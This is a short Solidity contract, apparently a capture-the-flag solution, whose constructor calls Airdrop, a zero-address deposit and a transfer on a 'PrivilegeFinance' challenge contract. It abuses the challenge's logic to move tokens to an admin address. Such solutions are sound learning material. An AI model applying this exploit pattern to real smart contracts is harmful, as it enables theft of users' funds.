pragma solidity ^0.8.4;

import "./GOATFinance.sol";

contract SolveGoat {
    constructor(address challenge, address admin) {
        PrivilegeFinance p = PrivilegeFinance(challenge);
        p.Airdrop();
        p.deposit(address(0), 1, msg.sender);
        p.transfer(admin, 1000);
    }
}
